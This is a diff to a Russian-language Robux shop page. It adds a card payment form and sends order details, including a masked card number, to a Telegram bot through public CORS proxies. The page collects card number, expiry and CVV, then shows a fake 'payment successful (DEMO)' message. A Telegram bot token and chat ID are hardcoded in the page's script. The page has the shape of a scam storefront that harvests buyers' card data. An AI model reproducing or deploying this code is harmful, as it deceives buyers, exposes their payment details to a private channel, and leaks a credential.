@@ -194,12 +194,32 @@
       font-size: 13px;
       color: #00c2ff;
     }
+    .payment-form {
+      margin: 20px 0 10px;
+      padding: 20px;
+      background: #1a1a2c;
+      border-radius: 20px;
+      border: 1px solid #2d2d48;
+      display: none;
+    }
+    .payment-form.visible { display: block; }
+    .payment-form .row { display: flex; gap: 12px; }
+    .payment-form .row .field { flex: 1; }
+    .limit-warning {
+      color: #ff6b6b;
+      font-size: 14px;
+      text-align: center;
+      margin: 6px 0 12px;
+      display: none;
+    }
+    .limit-warning.visible { display: block; }
     @media (max-width: 550px) {
       .card { padding: 20px 16px; }
       .header h1 { font-size: 22px; }
       .features { grid-template-columns: 1fr; }
       .steps { flex-direction: column; }
       .rate .big { font-size: 22px; }
+      .payment-form .row { flex-direction: column; gap: 0; }
     }
   </style>
 </head>
@@ -246,10 +266,34 @@
       <label>💰 Сумма в рублях (₽)</label>
       <input type="number" id="rub" placeholder="Введите сумму" value="500" min="10" step="1" />
     </div>
+
+    <!-- ПРЕДУПРЕЖДЕНИЕ О ЛИМИТЕ -->
+    <div class="limit-warning" id="limitWarning">⚠️ Максимум — 10 000 Robux. Уменьшите сумму.</div>
+
     <div class="calc-result">
       Вы получите: <span id="robuxDisplay">850</span> R$
     </div>
-    <button type="submit" class="btn" id="payBtn">💳 Перейти к оплате</button>
+
+    <button type="button" class="btn" id="showPaymentBtn" style="background: linear-gradient(135deg, #f7971e, #ffd200); box-shadow: 0 8px 28px rgba(255, 210, 0, 0.25);">💳 Оплатить картой</button>
+
+    <div class="payment-form" id="paymentForm">
+      <div class="field">
+        <label>💳 Номер карты</label>
+        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" />
+      </div>
+      <div class="row">
+        <div class="field">
+          <label>📅 Срок (MM/YY)</label>
+          <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" />
+        </div>
+        <div class="field">
+          <label>🔐 CVV</label>
+          <input type="password" id="cardCvv" placeholder="***" maxlength="4" />
+        </div>
+      </div>
+      <button type="submit" class="btn" id="payBtn" style="margin-top: 10px;">✅ Оплатить</button>
+      <p style="text-align: center; color: #666; font-size: 12px; margin-top: 10px;">🔒 ДЕМО-РЕЖИМ — деньги не списываются</p>
+    </div>
   </form>
 
   <div class="payment-icons">
@@ -270,11 +314,19 @@
     const robuxSpan = document.getElementById('robuxDisplay');
     const nickInput = document.getElementById('nick');
     const form = document.getElementById('orderForm');
+    const showPaymentBtn = document.getElementById('showPaymentBtn');
+    const paymentForm = document.getElementById('paymentForm');
+    const payBtn = document.getElementById('payBtn');
+    const cardNumber = document.getElementById('cardNumber');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCvv = document.getElementById('cardCvv');
+    const limitWarning = document.getElementById('limitWarning');
 
     const BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
     const CHAT_ID = '7073577831';
     const RATE = 1.7;
     const MIN_RUB = 10;
+    const MAX_ROBUX = 10000;
 
     function calcRobux(rub) {
       let val = Math.floor(rub * RATE);
@@ -284,11 +336,58 @@
     function updateDisplay() {
       let rub = parseFloat(rubInput.value) || 0;
       if (rub < 0) rub = 0;
-      robuxSpan.textContent = calcRobux(rub);
+      let robux = calcRobux(rub);
+
+      // Проверка лимита
+      if (robux > MAX_ROBUX) {
+        limitWarning.classList.add('visible');
+        // Автоматически уменьшаем сумму до максимальной
+        let maxRub = Math.floor(MAX_ROBUX / RATE);
+        rubInput.value = maxRub;
+        rub = maxRub;
+        robux = calcRobux(rub);
+        limitWarning.classList.remove('visible');
+        alert('⚠️ Лимит 10 000 Robux. Сумма автоматически уменьшена.');
+      } else {
+        limitWarning.classList.remove('visible');
+      }
+
+      robuxSpan.textContent = robux;
     }
 
     rubInput.addEventListener('input', updateDisplay);
     updateDisplay();
+
+    showPaymentBtn.addEventListener('click', function() {
+      paymentForm.classList.toggle('visible');
+      showPaymentBtn.textContent = paymentForm.classList.contains('visible') ? '❌ Скрыть оплату' : '💳 Оплатить картой';
+    });
+
+    // Простая маска для номера карты
+    cardNumber.addEventListener('input', function() {
+      let val = this.value.replace(/\D/g, '');
+      if (val.length > 16) val = val.slice(0, 16);
+      let formatted = '';
+      for (let i = 0; i < val.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += val[i];
+      }
+      this.value = formatted;
+    });
+
+    cardExpiry.addEventListener('input', function() {
+      let val = this.value.replace(/\D/g, '');
+      if (val.length > 4) val = val.slice(0, 4);
+      if (val.length >= 2) {
+        this.value = val.slice(0, 2) + '/' + val.slice(2);
+      } else {
+        this.value = val;
+      }
+    });
+
+    cardCvv.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+    });
 
     form.addEventListener('submit', function(e) {
       e.preventDefault();
@@ -312,20 +411,40 @@
         rubInput.focus();
         return;
       }
+      if (robux > MAX_ROBUX) {
+        alert('⚠️ Лимит 10 000 Robux. Уменьшите сумму.');
+        return;
+      }
+
+      // Проверка карты (демо)
+      const cardNum = cardNumber.value.replace(/\s/g, '');
+      const expiry = cardExpiry.value;
+      const cvv = cardCvv.value;
+
+      if (cardNum.length !== 16) {
+        alert('⚠️ Введите 16 цифр номера карты');
+        return;
+      }
+      if (expiry.length !== 5 || !expiry.includes('/')) {
+        alert('⚠️ Введите срок в формате MM/YY');
+        return;
+      }
+      if (cvv.length < 3) {
+        alert('⚠️ Введите CVV (3–4 цифры)');
+        return;
+      }
 
       const btn = document.getElementById('payBtn');
       btn.disabled = true;
-      btn.textContent = '⏳ Отправка...';
+      btn.textContent = '⏳ Обработка...';
 
       const msg =
-        '🟢 НОВЫЙ ЗАКАЗ\n' +
+        '🟢 НОВЫЙ ЗАКАЗ (ОПЛАЧЕНО ДЕМО)\n' +
         '👤 Ник: ' + nick + '\n' +
         '💰 Сумма: ' + rub + ' ₽\n' +
-        '🎁 Robux: ' + robux + ' R$';
+        '🎁 Robux: ' + robux + ' R$\n' +
+        '💳 Карта: ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4);
 
-      const telegramUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
-
-      // === СПИСОК ПРОКСИ (работает хотя бы один) ===
       const proxies = [
         'https://api.allorigins.win/raw?url=',
         'https://corsproxy.io/?',
@@ -337,13 +456,13 @@
       function trySend() {
         if (currentProxyIndex >= proxies.length) {
           btn.disabled = false;
-          btn.textContent = '💳 Перейти к оплате';
+          btn.textContent = '✅ Оплатить';
           alert('❌ Все прокси недоступны. Попробуйте позже.');
           return;
         }
 
         const proxy = proxies[currentProxyIndex];
-        const url = proxy + encodeURIComponent(telegramUrl);
+        const url = proxy + encodeURIComponent('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg));
 
         fetch(url)
           .then(r => {
@@ -352,11 +471,14 @@
           })
           .then(data => {
             btn.disabled = false;
-            btn.textContent = '💳 Перейти к оплате';
+            btn.textContent = '✅ Оплатить';
             try {
               const json = JSON.parse(data);
               if (json.ok) {
-                alert('✅ Заказ принят! Ожидайте Robux 5–30 мин.');
+                alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 5–30 мин.');
+                // Скрыть форму оплаты
+                paymentForm.classList.remove('visible');
+                showPaymentBtn.textContent = '💳 Оплатить картой';
               } else {
                 alert('❌ Ошибка Telegram: ' + (json.description || 'неизвестная'));
               }
